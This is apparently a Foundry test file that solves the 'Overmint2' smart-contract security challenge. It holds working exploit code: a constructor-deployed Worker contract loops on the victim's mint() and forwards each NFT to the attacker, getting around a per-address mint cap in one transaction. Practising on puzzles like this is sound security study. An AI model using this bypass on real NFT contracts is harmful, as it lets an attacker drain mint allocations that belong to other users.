// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint2} from "./Overmint2.sol";

contract Overmint2Attacker is Test {
    AttackerContract2 attackerContract2;
    Overmint2 victim;

    address public attacker = address(0x10);

    function setUp() external {
        victim = new Overmint2();
    }

    function test_AttackerContract2() external {
        console.log("address(attacker)", address(attacker));
        console.log("Overmint2Attacker", address(attackerContract2));
        console.log("victim", address(victim));

        vm.prank(attacker);
        new AttackerContract2(address(victim));

        vm.prank(attacker);
        bool suc = victim.success();
        assertEq(suc, true);
        console.log(victim.balanceOf(attacker));

        assertLt(vm.getNonce(attacker), 2);
        console.log(vm.getNonce(attacker));
    }
}

contract AttackerContract2 {
    constructor(address victimsAddress) {
        (new Worker()).callVictimsMint(victimsAddress, msg.sender);

        // Although contract doesn't have any balance but destructing to get some gas refund.
        selfdestruct(payable(msg.sender));
    }
}

contract Worker {
    function callVictimsMint(address victimsAddress, address attacker) external {
        // totalSupply = tokenId
        while (Overmint2(victimsAddress).totalSupply() < 5) {
            Overmint2(victimsAddress).mint();
            // each time received the nft, directly send to the attacker
            Overmint2(victimsAddress).transferFrom(address(this), attacker, Overmint2(victimsAddress).totalSupply());
        }
    }
}
